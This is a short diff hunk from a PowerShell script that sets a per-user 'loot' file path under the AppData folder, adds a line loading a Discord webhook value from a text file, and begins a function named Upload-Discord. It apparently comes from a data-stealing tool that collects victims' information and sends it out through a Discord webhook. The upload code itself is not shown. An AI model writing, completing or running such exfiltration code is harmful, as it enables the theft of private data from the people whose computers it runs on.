@@ -3,6 +3,8 @@ Add-Type -AssemblyName PresentationCore,PresentationFramework
 
 $Path="$env:appdata\-locker\$env:UserName-loot.txt"
 
+$dc = (Get-Content "$env:appdata\-locker\wh.txt" -TotalCount 1)
+
 function Upload-Discord {
 
 [CmdletBinding()]
